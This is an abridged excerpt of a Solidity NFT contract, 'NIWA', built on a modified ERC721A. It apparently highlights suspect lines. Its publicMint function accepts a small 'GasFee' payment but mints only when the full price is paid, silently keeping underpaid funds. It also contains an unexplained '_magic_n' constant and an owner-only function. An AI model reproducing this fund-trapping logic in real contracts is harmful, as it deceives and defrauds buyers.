...
contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
     ...
     */
     uint256 constant _magic_n = 1247;
...
contract NIWA  is ERC721A, Ownable {
    ...
    string  public uriPrefix = "ipfs://QmUPuHbEVm3xAqttQumDkyYDbjLFkv7XXpMwVe1EqAfoLL/";

    uint256 public immutable cost = 0.01 ether;
    uint256 public immutable GasFee = 0.003 ether;
    uint32 public immutable maxSupply = 1333;
    ...
    function publicMint (uint256 amount) public payable callerIsUser{
        ...
        require(msg.value >= GasFee, "insufficient");
        if (msg.value >= cost * amount) {
            _safeMint(msg.sender, amount);
        }
    }

    function stakeToFabrik (uint256 amount) public onlyOwner {
